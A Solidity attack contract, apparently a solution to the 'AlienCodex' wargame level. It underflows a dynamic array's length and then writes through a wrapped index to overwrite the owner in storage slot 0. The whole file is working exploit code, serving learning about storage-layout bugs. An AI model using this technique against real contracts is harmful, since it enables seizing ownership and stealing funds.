// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;

    function retract() external;

    function revise(uint256, bytes32) external;
}

contract AlienCodexAttack {
    IAlienCodex alienCodex;

    // Storage slot index where the length of the dynamic array `codex` is stored
    uint256 constant SLOT_INDEX = 1;

    // Starting storage slot (base address) for the elements of the dynamic array `codex`
    // Calculated as keccak256(SLOT_INDEX) according to Solidity storage layout rules
    bytes32 constant baseAddress = keccak256(abi.encodePacked(SLOT_INDEX));

    constructor(address _targetAddress) {
        alienCodex = IAlienCodex(_targetAddress);
    }

    function attackPrepare() public {
        // enable contacted
        alienCodex.makeContact();

        // set codex.length as -1 (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
        alienCodex.retract();
    }

    function attack() public {
        // The `owner` variable is stored at storage slot 0
        uint256 offset = ~uint256(baseAddress) + 1;

        // overwrite as msg.sender
        uint256 slot = uint256(uint160(msg.sender));

        // baseAddress + offset = 0
        // so slot 0 will be written
        alienCodex.revise(offset, bytes32(slot));
    }
}
